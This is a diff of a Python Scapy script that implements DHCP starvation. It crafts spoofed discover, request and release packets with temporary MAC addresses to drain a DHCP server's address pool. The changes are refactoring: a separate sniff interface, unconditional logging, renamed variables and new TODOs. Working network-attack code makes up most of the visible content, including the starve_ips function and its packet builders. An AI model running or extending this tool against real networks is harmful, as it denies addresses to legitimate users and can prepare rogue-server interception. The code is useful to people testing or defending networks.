@@ -17,7 +17,7 @@ IP_GLOBAL_BROADCAST='255.255.255.255'
 args = SimpleNamespace()
 args.keep_alive=False
 args.keep_alive_while_starving=False
-args.sniff_interface = conf.iface
+args.sniff_interface : str = None
 args.ttl = 5
 
 def get_dhcp_type_value(dhcp_type : str):
@@ -35,8 +35,10 @@ class BOOTP_ATTS:
 
 """
 TODO option to write pcap
-TODO option to get replies without being promisc
+TODO option to get replies without being promisc (wireless)
 TODO is in network scapy
+refactor BOOTP packet construction
+check for dhcp ack
 """
 
 
@@ -61,6 +63,7 @@ def mac_to_binary(regular_mac : str):
     """
     function_name = inspect.currentframe().f_code.co_name
     regular_mac_copy = regular_mac
+    
     regular_mac = regular_mac.replace(':', '')
     #BOOTP accepts raw mac for some reason
 
@@ -80,16 +83,15 @@ def dhcp_release(server_mac : str ,server_ip : str, ip : str , src_mac : str, tr
     dhcp_options= [('message-type','release'), ('server_id', server_ip),('end')]
 
 
-    releaseMyIp = Ether(dst=server_mac, src=src_mac)\
+    dhcp_release_packet = Ether(dst=server_mac, src=src_mac)\
                     / IP(dst=server_ip,src=ip,ttl=args.ttl)\
                     / UDP(dport=DHCP_ATTS.SERVER_PORT,sport=DHCP_ATTS.CLIENT_PORT)\
                     / BOOTP(htype=1,op=1,chaddr=mac_to_binary(src_mac), xid = transaction_id, ciaddr = ip)\
                     / DHCP(options=dhcp_options)
     
-    if(args.debug):
-        logger.info(f"{function_name} : sending dhcp release from {ip},{src_mac} to {server_ip},{server_mac} via {interface}")
+    logger.info(f"{function_name} : sending dhcp release from {ip},{src_mac} to {server_ip},{server_mac} via {interface}")
         
-    sendp(releaseMyIp, iface=interface)
+    sendp(dhcp_release_packet, iface=interface)
 
 def dhcp_request( ip : str, device_mac : str, transaction_id : hex, server_ip : str, interface : str = conf.iface):
     """
@@ -104,8 +106,7 @@ def dhcp_request( ip : str, device_mac : str, transaction_id : hex, server_ip : 
                     / UDP(dport=DHCP_ATTS.SERVER_PORT,sport=DHCP_ATTS.CLIENT_PORT)\
                     / BOOTP(htype=1,op=1,chaddr=mac_to_binary(device_mac), hops = 2, xid = transaction_id)\
                     / DHCP(options=dhcp_options)
-    if(args.debug):
-        logger.info(f"{function_name} : sending dhcp request for {ip} to {server_ip}, via {interface}")
+    logger.info(f"{function_name} : sending dhcp request for {ip} to {server_ip}, via {interface}")
     sendp(request_packet, iface=interface)
 
 def dhcp_discover(src_mac : str, interface : str = conf.iface):
@@ -129,8 +130,7 @@ def is_bootp(packet)->bool:
     function_name = inspect.currentframe().f_code.co_name
 
     if(BOOTP not in packet):
-        if(args.debug):
-            logger.warning(f"{function_name} : packet not BOOTP [{packet}]")
+        logger.warning(f"{function_name} : packet not BOOTP [{packet}]")
         return False
 
     return True
@@ -145,8 +145,7 @@ def is_dhcp(packet)->bool:
         return False
 
     if(DHCP not in packet):
-        if(args.debug):
-            logger.warning(f"{function_name} : packet not DHCP [{packet}]")
+        logger.warning(f"{function_name} : packet not DHCP [{packet}]")
         return False
 
     return True
@@ -173,8 +172,7 @@ def capture_my_dhcp_offer(dest_mac : str, server_mac : str, interface : str = co
     """
     function_name = inspect.currentframe().f_code.co_name
 
-    if (args.debug):
-        logger.info(f"{function_name} : sniffing on interface {interface} for dhcp offers for {dest_mac}")
+    logger.info(f"{function_name} : sniffing on interface {interface} for dhcp offers for {dest_mac}")
     
     res = sniff(count=1, filter = f"udp and ether src {server_mac}", timeout=4, iface=args.sniff_interface,\
             lfilter= lambda packet : is_my_dhcp_offer(packet, dest_mac))
@@ -231,8 +229,7 @@ def is_dhcp_msg_type_eq(packet, value : int )->bool:
 def is_for_my_mac(mac : str, packet):
     function_name = inspect.currentframe().f_code.co_name
     
-    if(args.debug):
-            logger.debug(f"{function_name} : {packet} is destined for {packet[Ether].dst} and provided mac is {mac}")
+    logger.debug(f"{function_name} : {packet} is destined for {packet[Ether].dst} and provided mac is {mac}")
     return packet[Ether].dst == mac
 
 def find_dhcp_option(option : str, dhcp_pdu : scapy.layers.dhcp.DHCP):
@@ -264,7 +261,7 @@ def is_bootp_reply(packet)->bool:
 
 
 
-def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface ,ips_to_starve : int = 5)->List[Tuple[str, str, str]]:
+def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface ,sniff_interface : str = conf.iface, ips_to_starve : int = 5)->List[Tuple[str, str, str]]:
     """
     TODO check if dhcp request if acked
     TODO option to keep alive ip's while starving
@@ -303,7 +300,7 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
 
         offer = [None]
         
-        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac, server_mac, interface ,offer])
+        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac, server_mac, sniff_interface ,offer])
         sniff_thread.start()
         
         time.sleep(0.2)
@@ -346,8 +343,7 @@ def sendp_icmp(src_ip : str, src_mac : str, dst_ip : str, dst_mac : str, interfa
     packet = Ether(dst = dst_mac, src = src_mac , type=ETHER_TYPES.IPv4)\
             / IP(src = src_ip, dst = dst_ip)\
             / ICMP()
-    # if(args.debug):
-    #     print(f"{function_name} : sending {packet} to {dst_ip},{dst_mac} via {interface}")
+    logger.debug(f"{function_name} : sending {packet} to {dst_ip},{dst_mac} via {interface}")
     
     sendp(packet, iface=interface)
 
